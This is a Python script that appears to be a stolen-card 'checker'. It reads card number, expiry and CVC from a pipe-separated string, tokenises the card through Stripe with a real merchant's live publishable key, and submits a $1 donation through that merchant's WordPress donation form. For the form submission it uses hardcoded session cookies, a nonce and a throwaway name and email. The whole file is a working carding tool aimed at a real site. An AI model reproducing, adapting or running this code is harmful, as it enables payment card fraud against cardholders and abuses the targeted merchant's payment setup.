import requests

def Tele(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")
    
    # Handle two-digit year
    if "20" in yy:
        yy = yy.split("20")[1]
    
    # Initialize a requests session
    r = requests.Session()

    # Set headers for the first request
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    # Format data for the first POST request
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F89f50b7e22%3B+stripe-js-v3%2F89f50b7e22%3B+card-element&referrer=https%3A%2F%2Fstore.urbanintellectuals.com&time_on_page=21835&key=pk_live_51AsBhoBdtygdp7aFScml5x3ULbjE0pexUglwUnEzPRB2TLwS9Yey2bISLB3giKyuPkPFLJREQK1wQuTvysZRD6Xh00D75TygTo'

    # Send the first POST request to Stripe
    r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    # Extract the payment method ID from the JSON response
    pm = r1.json().get('id')
    if not pm:
        return {"error": "Failed to retrieve payment method ID"}

    # Prepare cookies for the second POST request
    cookies = {
        '__cf_bm': '4BOi8sbTquWu4DpCxs.CG3KwNeBXOEycom4vqK__PqQ-1730447759-1.0.1.1-ACs9e7YDID8hLd.Lqn58epc1TjtFTbVoNTebzDJkq7n0Vw7e59pKfkRjWikl2iP3tpGqiFZK_aYIkij89oxgiQ',
        '_cfuvid': 'KayS2SbEWJfdpjrrkBNkmrmQCkmGSikHTMUS3g5P5TA-1730447759535-0.0.1.1-604800000',
        'wffn_traffic_source': 'https://www.google.com/',
        'wffn_flt': '2024-11-1 03:56:22',
        'wffn_timezone': 'Asia/Rangoon',
        'wffn_is_mobile': 'true',
        'wffn_browser': 'Chrome',
        'wffn_referrer': 'https://www.google.com/',
        'wffn_fl_url': '/donate/',
        '_ga': 'GA1.1.410417492.1730447789',
        '_gcl_au': '1.1.1499731567.1730447791',
        '_clck': 'jrws1t%7C2%7Cfqi%7C0%7C1766',
        '_tt_enable_cookie': '1',
        '_ttp': 'yfHVWLjR59YSpRbIVeKdgk2B8dB',
        '_ga_CZ2TGBH8QS': 'GS1.1.1730447788.1.0.1730447793.55.0.0',
        '_clsk': '1lvniyf%7C1730447801895%7C1%7C1%7Cu.clarity.ms%2Fcollect',
    }

    # Set headers for the second request
    headers = {
        'authority': 'store.urbanintellectuals.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://store.urbanintellectuals.com',
        'referer': 'https://store.urbanintellectuals.com/donate/?srsltid=AfmBOor_U0RbrCZqQea5FcYdTBRfSKOIi6BXJ2i18pNQRCGHUbamvHOo',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # Set parameters and data for the second POST request
    params = {'t': '1730447810727'}
    data = {
        'data': f'__fluent_form_embded_post_id=1669077&_fluentform_46_fluentformnonce=15b487ae05&_wp_http_referer=%2Fdonate%2F%3Fsrsltid%3DAfmBOor_U0RbrCZqQea5FcYdTBRfSKOIi6BXJ2i18pNQRCGHUbamvHOo&names%5Bfirst_name%5D=waznim&names%5Blast_name%5D=ey&email=waznimey%40gmail.com&checkbox_1%5B%5D=Send%20me%20future%20communication%20regarding%20donations%2C%20how%20my%20donation%20is%20being%20used%20and%20future%20drives.&checkbox_1%5B%5D=Add%20me%20to%20the%20Urban%20Intellectuals%20Newsletter%20for%20news%2C%20marketing%2C%20updates%20and%20more&input_radio=One%20time%20donation&payment_input=Other&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id={pm}',
        'action': 'fluentform_submit',
        'form_id': '46',
    }

    # Send the second POST request
    r2 = r.post('https://store.urbanintellectuals.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)

    return r2.json()
